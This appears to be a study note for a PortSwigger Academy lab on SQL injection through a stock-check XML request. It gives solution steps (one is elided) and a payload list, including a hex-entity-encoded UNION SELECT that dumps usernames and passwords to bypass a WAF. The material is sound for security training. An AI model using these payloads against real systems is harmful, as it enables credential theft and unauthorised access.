# Lab: SQL injection with filter bypass via XML encoding

**Official lab:** [Lab: SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

## Lab idea

Practices assessing how request filtering or a WAF may be bypassed through alternate encoding in a SQLi scenario involving a stock-check feature and returned query results.

## Vulnerability in brief
SQL injection (SQLi) is a web vulnerability in which untrusted input changes the meaning of a SQL query made by an application. It commonly occurs when an application builds a query by concatenating user-controlled values into SQL instead of keeping query structure separate from data. Inputs may arrive through form fields, URL parameters, cookies, headers, or other request data. Injection can occur in different query types and positions, not only in a `SELECT` statement's `WHERE` clause.

## Solution idea
1. Observe that the stock check feature sends the productId and storeId to the application in XML format.
2. Send the POST /product/stock request to Burp Repeater.
3. In Burp Repeater, probe the storeId to see whether your input is evaluated.
4. Observe that your input appears to be evaluated by the application, returning the stock for different stores.
- …
6. As you can only return one column, you need to concatenate the returned usernames and passwords, for example: <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM…
7. Send this query and observe that you've successfully fetched the usernames and passwords from the database, separated by a ~ character.
8. Use the administrator's credentials to log in and solve the lab.

## Payloads / key values
- `productId`
- `storeId`
- `POST /product/stock`
- `<storeId>1+1</storeId>`
- `UNION SELECT`
- `<storeId>1 UNION SELECT NULL</storeId>`
- `0 units`
- `<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>`
- `~`

## Official source
- [PortSwigger Academy: Lab: SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
